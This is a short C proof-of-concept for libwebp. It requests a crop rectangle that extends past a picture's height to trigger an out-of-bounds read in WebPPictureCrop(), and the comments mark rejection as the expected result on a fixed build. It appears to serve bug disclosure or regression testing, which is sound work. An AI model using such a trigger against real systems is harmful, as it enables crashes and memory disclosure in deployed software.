// PoC: WebPPictureCrop() accepts an out-of-bounds crop rectangle when the
// requested crop height, combined with the image width, slips past the
// bounds check in AdjustAndCheckRectangle(), causing WebPCopyPlane() to
// read past the end of the source picture's pixel buffer.
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "webp/encode.h"

int main(void) {
  const int width = 100;
  const int height = 200;
  WebPPicture pic;
  uint8_t* rgba;

  if (!WebPPictureInit(&pic)) return 1;
  pic.use_argb = 1;
  pic.width = width;
  pic.height = height;

  rgba = (uint8_t*)malloc((size_t)width * height * 4);
  if (rgba == NULL) return 1;
  memset(rgba, 0x42, (size_t)width * height * 4);

  if (!WebPPictureImportRGBA(&pic, rgba, width * 4)) {
    free(rgba);
    return 1;
  }
  free(rgba);

  // Crop rectangle: left=0, top=90, width=100, height=150.
  // top + height = 240 > pic.height (200): this must be rejected, but
  // the buggy bounds check lets it through.
  if (!WebPPictureCrop(&pic, 0, 90, width, 150)) {
    WebPPictureFree(&pic);
    return 0;  // Correctly rejected (expected on a fixed build).
  }

  WebPPictureFree(&pic);
  return 0;
}
